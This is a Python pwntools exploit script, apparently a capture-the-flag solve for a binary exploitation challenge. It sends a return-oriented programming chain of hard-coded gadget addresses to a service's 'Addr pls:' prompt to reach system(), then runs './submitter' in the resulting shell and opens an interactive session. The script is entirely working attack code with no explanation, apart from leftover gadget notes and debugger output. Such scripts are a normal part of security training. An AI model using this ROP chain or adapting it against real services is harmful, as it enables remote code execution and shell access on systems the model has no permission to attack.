from pwn import *

context.log_level = 'info'
context.arch = "amd64"

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337
p = remote(HOST, int(PORT))

sl = lambda data : p.sendline(data.encode())
ru = lambda text : p.recvuntil(text)

#解释一下上述反汇编代码
def send_data(data):
    ru(b"Addr pls: ")
    # print(data,hex(data))
    if data!=0:
         sl(hex(data).replace("0x",""))
    else:
        sl("0")

def send_list(data_list):
    for data in data_list:
        send_data(data)

#0x0000000000401796: pop rbx; pop r12; pop rbp; ret
#
"""
0x0000000000402218 : pop rdi ; pop rbp ; ret
0x0000000000402216 : pop rsi ; pop r15 ; pop rbp ; ret
0x0000000000458422: movsd dword ptr [rdi], dword ptr [rsi]; ret;
challenge       0x418317 jae 0x418319 /* 's' */
challenge       0x411315 push -0x76bf0000 /* 'h' */

0x0000000000493933 : or edi, esi ; add eax, dword ptr [rax] ; ret
0x0000000000436488: xchg esi, eax; ret;

"""

# pwndbg> x/i 0x0000000000434565
#    0x434565 <_dl_get_origin+53>:        lea    ebx,[rbp-0x1020]
# pwndbg>
#    0x43456b <_dl_get_origin+59>:        mov    rdx,rbx
# pwndbg>
#    0x43456e <_dl_get_origin+62>:        syscall

or_edi_esi = 0x0000000000493933
xchg_esi_eax = 0x0000000000436488
call_system = 0x401917

pop_rdi_rbp= 0x0000000000402218
pop_rsi_r15_rbp = 0x0000000000402216
movs_rdi_rsi = 0x0000000000458422
s_str = 0x418317
h_str = 0x411315
# gdb.attach(p, api=True,gdbscript="""
# b *0x401A55
# """)
send_data(pop_rdi_rbp)
send_data(pop_rdi_rbp-0x10)
send_data(pop_rdi_rbp-0x10)
send_data(0x400000005)
# send_data(0x426453)
# send_data(0x458422)
send_list([
    pop_rsi_r15_rbp, 0x401000, 0x401000, 0x401000,
    pop_rdi_rbp, 0x480489, 0x401000,
    xchg_esi_eax, 
    pop_rsi_r15_rbp, 0x20070, 0x401000, 0x401000,
    or_edi_esi, 0x493937,
    call_system,
])
send_data(00)

p.sendline(b"./submitter")

p.interactive()